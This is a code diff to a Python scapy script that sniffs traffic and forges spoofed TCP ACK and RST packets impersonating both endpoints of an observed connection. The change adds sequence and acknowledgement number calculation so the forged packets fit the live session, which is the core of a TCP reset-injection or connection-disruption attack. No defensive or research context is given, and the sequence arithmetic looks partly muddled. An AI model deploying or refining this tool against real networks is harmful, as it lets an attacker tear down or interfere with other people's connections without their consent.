@@ -2,6 +2,7 @@ import time
 from scapy.all import sniff, send, IP, TCP, conf
 import json
 from pathlib import Path
+import random
 
 
 ARGS = json.loads(Path("config.json").read_text())
@@ -18,10 +19,20 @@ def cap_filter(packet) -> bool:
 
 
 def send_acks(packet) -> None:
+    size = len(packet[TCP].payload)
+    seq = packet[TCP].seq
+    ack = packet[TCP].ack
+    ack = seq + size
+    seq = ack
+
     # send to source
     to_src = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(
-        flags="A", sport=packet[TCP].dport, dport=packet[TCP].sport
-    )
+        flags="A",
+        sport=packet[TCP].dport,
+        dport=packet[TCP].sport,
+        seq=seq,
+        ack=ack    # packet[TCP].ack,
+    ) / "dummy payload"
     for _ in range(3):
         SOCKET.send(
             to_src,
@@ -29,8 +40,12 @@ def send_acks(packet) -> None:
 
     # send to destination
     to_dst = IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(
-        flags="A", sport=packet[TCP].sport, dport=packet[TCP].dport
-    )
+        flags="A",
+        sport=packet[TCP].sport,
+        dport=packet[TCP].dport,
+        seq=seq,
+        ack=ack,
+    ) / "dummy payload"
     for _ in range(3):
         SOCKET.send(
             to_dst,
@@ -38,16 +53,30 @@ def send_acks(packet) -> None:
 
 
 def send_rsts(packet) -> None:
+    size = len(packet[TCP].payload)
+    seq = packet[TCP].seq
+    ack = packet[TCP].ack
+    ack = seq + size
+    seq = ack
+
     # send to source
     to_src = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(
-        flags="R", sport=packet[TCP].dport, dport=packet[TCP].sport
-    )
+        flags="R",
+        sport=packet[TCP].dport,
+        dport=packet[TCP].sport,
+        seq=seq,
+        ack=ack
+    ) / "dummy payload"
     SOCKET.send(to_src)
 
     # send to destination
     to_dst = IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(
-        flags="R", sport=packet[TCP].sport, dport=packet[TCP].dport
-    )
+        flags="R",
+        sport=packet[TCP].sport,
+        dport=packet[TCP].dport,
+        seq=seq,
+        ack=ack
+    ) / "dummy payload"
     SOCKET.send(
         to_dst,
     )
